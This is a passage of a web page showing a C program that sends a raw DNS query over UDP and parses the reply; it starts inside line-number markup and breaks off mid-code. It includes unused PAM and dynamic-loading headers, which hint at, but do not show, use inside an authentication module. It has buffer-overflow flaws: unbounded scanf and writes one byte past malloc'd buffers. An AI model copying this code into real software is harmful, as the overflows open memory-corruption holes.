class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DNS Query Program on Linux</span></span><br><span class="line"><span class="comment">//Author : Silver Moon (m00n.silv3r@gmail.com)</span></span><br><span class="line"><span class="comment">//Dated : 29/4/2009</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Header Files</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> <span class="comment">//printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span>    <span class="comment">//strlen</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>    <span class="comment">//malloc</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span>    <span class="comment">//you know what this is for</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;arpa/inet.h&gt;</span> <span class="comment">//inet_addr , inet_ntoa , ntohs etc</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>    <span class="comment">//getpid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_modules.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;security/pam_modutil.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//List of DNS Servers registered on the system</span></span><br><span class="line"><span class="type">char</span> dns_servers[<span class="number">10</span>][<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> dns_server_count = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//Types of DNS resource records :)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_A 1 <span class="comment">//Ipv4 address</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_NS 2 <span class="comment">//Nameserver</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CNAME 5 <span class="comment">// canonical name</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_SOA 6 <span class="comment">/* start of authority zone */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_PTR 12 <span class="comment">/* domain name pointer */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_MX 15 <span class="comment">//Mail server</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Function Prototypes</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ngethostbyname</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* , <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ChangetoDnsNameFormat</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*,<span class="type">unsigned</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">ReadName</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*,<span class="type">unsigned</span> <span class="type">char</span>*,<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_dns_servers</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DNS header structure</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> id; <span class="comment">// identification number</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> rd :<span class="number">1</span>; <span class="comment">// recursion desired</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tc :<span class="number">1</span>; <span class="comment">// truncated message</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> aa :<span class="number">1</span>; <span class="comment">// authoritive answer</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> opcode :<span class="number">4</span>; <span class="comment">// purpose of message</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> qr :<span class="number">1</span>; <span class="comment">// query/response flag</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> rcode :<span class="number">4</span>; <span class="comment">// response code</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cd :<span class="number">1</span>; <span class="comment">// checking disabled</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ad :<span class="number">1</span>; <span class="comment">// authenticated data</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> z :<span class="number">1</span>; <span class="comment">// its z! reserved</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ra :<span class="number">1</span>; <span class="comment">// recursion available</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> q_count; <span class="comment">// number of question entries</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> ans_count; <span class="comment">// number of answer entries</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> auth_count; <span class="comment">// number of authority entries</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> add_count; <span class="comment">// number of resource entries</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Constant sized fields of query structure</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QUESTION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> qtype;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> qclass;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Constant sized fields of the resource record structure</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">R_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> _class;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ttl;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> data_len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Pointers to resource record contents</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RES_RECORD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">R_DATA</span> *<span class="title">resource</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rdata;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Structure of a Query</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QUESTION</span> *<span class="title">ques</span>;</span></span><br><span class="line">&#125; QUERY;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( <span class="type">int</span> argc , <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hostname[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Get the DNS servers from the resolv.conf file</span></span><br><span class="line">    get_dns_servers();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Get the hostname from the terminal</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter Hostname to Lookup : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span> , hostname);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Now get the ip of this hostname , A record</span></span><br><span class="line">    ngethostbyname(hostname , T_A);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Perform a DNS query by sending a packet</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ngethostbyname</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *host , <span class="type">int</span> query_type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">65536</span>],*qname,*reader;</span><br><span class="line">    <span class="type">int</span> i , j , stop , s;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">a</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">RES_RECORD</span> <span class="title">answers</span>[20],<span class="title">auth</span>[20],<span class="title">addit</span>[20];</span> <span class="comment">//the replies from the DNS server</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNS_HEADER</span> *<span class="title">dns</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QUESTION</span> *<span class="title">qinfo</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Resolving %s&quot;</span> , host);</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); <span class="comment">//UDP packet for DNS queries</span></span><br><span class="line"></span><br><span class="line">    dest.sin_family = AF_INET;</span><br><span class="line">    dest.sin_port = htons(<span class="number">53</span>);</span><br><span class="line">    dest.sin_addr.s_addr = inet_addr(dns_servers[<span class="number">0</span>]); <span class="comment">//dns servers</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Set the DNS structure to standard queries</span></span><br><span class="line">    dns = (<span class="keyword">struct</span> DNS_HEADER *)&amp;buf;</span><br><span class="line"></span><br><span class="line">    dns-&gt;id = (<span class="type">unsigned</span> <span class="type">short</span>) htons(getpid());</span><br><span class="line">    dns-&gt;qr = <span class="number">0</span>; <span class="comment">//This is a query</span></span><br><span class="line">    dns-&gt;opcode = <span class="number">0</span>; <span class="comment">//This is a standard query</span></span><br><span class="line">    dns-&gt;aa = <span class="number">0</span>; <span class="comment">//Not Authoritative</span></span><br><span class="line">    dns-&gt;tc = <span class="number">0</span>; <span class="comment">//This message is not truncated</span></span><br><span class="line">    dns-&gt;rd = <span class="number">1</span>; <span class="comment">//Recursion Desired</span></span><br><span class="line">    dns-&gt;ra = <span class="number">0</span>; <span class="comment">//Recursion not available! hey we dont have it (lol)</span></span><br><span class="line">    dns-&gt;z = <span class="number">0</span>;</span><br><span class="line">    dns-&gt;ad = <span class="number">0</span>;</span><br><span class="line">    dns-&gt;cd = <span class="number">0</span>;</span><br><span class="line">    dns-&gt;rcode = <span class="number">0</span>;</span><br><span class="line">    dns-&gt;q_count = htons(<span class="number">1</span>); <span class="comment">//we have only 1 question</span></span><br><span class="line">    dns-&gt;ans_count = <span class="number">0</span>;</span><br><span class="line">    dns-&gt;auth_count = <span class="number">0</span>;</span><br><span class="line">    dns-&gt;add_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//point to the query portion</span></span><br><span class="line">    qname =(<span class="type">unsigned</span> <span class="type">char</span>*)&amp;buf[<span class="keyword">sizeof</span>(<span class="keyword">struct</span> DNS_HEADER)];</span><br><span class="line"></span><br><span class="line">    ChangetoDnsNameFormat(qname , host);</span><br><span class="line">    qinfo =(<span class="keyword">struct</span> QUESTION*)&amp;buf[<span class="keyword">sizeof</span>(<span class="keyword">struct</span> DNS_HEADER) + (<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)qname) + <span class="number">1</span>)]; <span class="comment">//fill it</span></span><br><span class="line"></span><br><span class="line">    qinfo-&gt;qtype = htons( query_type ); <span class="comment">//type of the query , A , MX , CNAME , NS etc</span></span><br><span class="line">    qinfo-&gt;qclass = htons(<span class="number">1</span>); <span class="comment">//its internet (lol)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nSending Packet...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( sendto(s,(<span class="type">char</span>*)buf,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> DNS_HEADER) + (<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)qname)+<span class="number">1</span>) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> QUESTION),<span class="number">0</span>,(<span class="keyword">struct</span> sockaddr*)&amp;dest,<span class="keyword">sizeof</span>(dest)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;sendto failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Receive the answer</span></span><br><span class="line">    i = <span class="keyword">sizeof</span> dest;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nReceiving answer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(recvfrom (s,(<span class="type">char</span>*)buf , <span class="number">65536</span> , <span class="number">0</span> , (<span class="keyword">struct</span> sockaddr*)&amp;dest , (<span class="type">socklen_t</span>*)&amp;i ) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;recvfrom failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dns = (<span class="keyword">struct</span> DNS_HEADER*) buf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//move ahead of the dns header and the query field</span></span><br><span class="line">    reader = &amp;buf[<span class="keyword">sizeof</span>(<span class="keyword">struct</span> DNS_HEADER) + (<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)qname)+<span class="number">1</span>) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> QUESTION)];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe response contains : &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n %d Questions.&quot;</span>,ntohs(dns-&gt;q_count));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n %d Answers.&quot;</span>,ntohs(dns-&gt;ans_count));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n %d Authoritative Servers.&quot;</span>,ntohs(dns-&gt;auth_count));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n %d Additional records.\n\n&quot;</span>,ntohs(dns-&gt;add_count));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Start reading answers</span></span><br><span class="line">    stop=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;ntohs(dns-&gt;ans_count);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        answers[i].name=ReadName(reader,buf,&amp;stop);</span><br><span class="line">        reader = reader + stop;</span><br><span class="line"></span><br><span class="line">        answers[i].resource = (<span class="keyword">struct</span> R_DATA*)(reader);</span><br><span class="line">        reader = reader + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> R_DATA);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ntohs(answers[i].resource-&gt;type) == <span class="number">1</span>) <span class="comment">//if its an ipv4 address</span></span><br><span class="line">        &#123;</span><br><span class="line">            answers[i].rdata = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(ntohs(answers[i].resource-&gt;data_len));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;ntohs(answers[i].resource-&gt;data_len) ; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                answers[i].rdata[j]=reader[j];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            answers[i].rdata[ntohs(answers[i].resource-&gt;data_len)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            reader = reader + ntohs(answers[i].resource-&gt;data_len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            answers[i].rdata = ReadName(reader,buf,&amp;stop);</span><br><span class="line">            reader = reader + stop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//read authorities</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;ntohs(dns-&gt;auth_count);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        auth[i].name=ReadName(reader,buf,&amp;stop);</span><br><span class="line">        reader+=stop;</span><br><span class="line"></span><br><span class="line">        auth[i].resource=(<span class="keyword">struct</span> R_DATA*)(reader);</span><br><span class="line">        reader+=<span class="keyword">sizeof</span>(<span class="keyword">struct</span> R_DATA);</span><br><span class="line"></span><br><span class="line">        auth[i].rdata=ReadName(reader,buf,&amp;stop);</span><br><span class="line">        reader+=stop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//read additional</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;ntohs(dns-&gt;add_count);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        addit[i].name=ReadName(reader,buf,&amp;stop);</span><br><span class="line">        reader+=stop;</span><br><span class="line"></span><br><span class="line">        addit[i].resource=(<span class="keyword">struct</span> R_DATA*)(reader);</span><br><span class="line">        reader+=<span class="keyword">sizeof</span>(<span class="keyword">struct</span> R_DATA);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ntohs(addit[i].resource-&gt;type)==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addit[i].rdata = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(ntohs(addit[i].resource-&gt;data_len));</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;ntohs(addit[i].resource-&gt;data_len);j++)</span><br><span class="line">            addit[i].rdata[j]=reader[j];</span><br><span class="line"></span><br><span class="line">            addit[i].rdata[ntohs(addit[i].resource-&gt;data_len)]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            reader+=ntohs(addit[i].resource-&gt;data_len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            addit[i].rdata=ReadName(reader,buf,&amp;stop);</span><br><span class="line">            reader+=stop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//print answers</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nAnswer Records : %d \n&quot;</span> , ntohs(dns-&gt;ans_count) );</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ; i &lt; ntohs(dns-&gt;ans_count) ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Name : %s &quot;</span>,answers[i].name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( ntohs(answers[i].resource-&gt;type) == T_A) <span class="comment">//IPv4 address</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">long</span> *p;</span><br><span class="line">            p=(<span class="type">long</span>*)answers[i].rdata;</span><br><span class="line">            a.sin_addr.s_addr=(*p); <span class="comment">//working without ntohl</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;has IPv4 address : %s&quot;</span>,inet_ntoa(a.sin_addr));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ntohs(answers[i].resource-&gt;type)==<span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Canonical name for an alias</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;has alias name : %s&quot;</span>,answers[i].rdata);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//print authorities</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nAuthoritive Records : %d \n&quot;</span> , ntohs(dns-&gt;auth_count) );</span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span> ; i &lt; ntohs(dns-&gt;auth_count) ; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Name : %s &quot;</span>,auth[i].name);</span><br><span class="line">        <span class="keyword">if</span>(ntohs(auth[i].resource-&gt;type)==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;has nameserver : %s&quot;</span>,auth[i].rdata);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//print additional resource records</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nAdditional Records : %d \n&quot;</span> , ntohs(dns-&gt;add_count) );</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; ntohs(dns-&gt;add_count) ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Name : %s &quot;</span>,addit[i].name);</span><br><span class="line">        <span class="keyword">if</span>(ntohs(addit[i].resource-&gt;type)==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">long</span> *p;</span><br><span class="line">            p=(<span class="type">long</span>*)addit[i].rdata;</span><br><span class="line">            a.sin_addr.s_addr=(*p);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;has IPv4 address : %s&quot;</span>,inet_ntoa(a.sin_addr));</span><br><span class="line">        &#125;</span><br><span class="line">        <span 